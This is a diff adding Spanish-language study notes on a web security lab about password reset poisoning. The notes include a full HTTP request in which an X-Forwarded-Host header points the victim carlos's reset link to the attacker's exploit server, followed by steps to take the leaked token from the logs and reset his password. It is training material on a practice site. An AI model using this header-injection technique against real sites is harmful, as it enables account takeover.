@@ -394,7 +394,45 @@ Cache-Control: max-age=0
 6. obtenemos su cookie y decodeamos base64 y entramos a la cuenta de carlos borramos el user y se reolvio el lab.
 
 
+# Password reset poisoning via middleware
 
+Analizar el proceso de restablecimiento de contraseña
+Como de costumbre, el primer paso es analizar la funcionalidad del laboratorio, en este caso, la función de restablecimiento de contraseña. Al hacer clic en el enlace "¿Olvidó su contraseña?" e ingresar el nombre de usuario wiener, recibimos un correo electrónico de restablecimiento de contraseña en nuestra cuenta de correo electrónico:
+
+1. Osea vamos a usar el sistema de restablecer contraseña "olvido el password" 
+2. Ponemos de ejemplo a wiener porque tenemos acceso a su correo
+3. Analizamos que cabeceras uso para cambiar el password
+
+```
+POST /forgot-password HTTP/1.1
+Host: 0a8400be04a1757dc0cd039a001e004a.web-security-academy.net
+Cookie: session=IryXJLXKw7UUc8apOi3kEZt9LgptE9Ny
+Content-Length: 15
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://0a8400be04a1757dc0cd039a001e004a.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a8400be04a1757dc0cd039a001e004a.web-security-academy.net/forgot-password
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+X-Forwarded-Host: exploit-0a780020043c7500c08e0313017e00e7.web-security-academy.net
+
+username=carlos 
+
+```
+4. Se le agrega la header X-Forwarded ( aun no entiendo por que) y despuues
+5. Vamos a los logs y copiamos y pegamos el token 
+6. Usamos el link y pegamos el token y cambia el password de carlos!
 
 
 
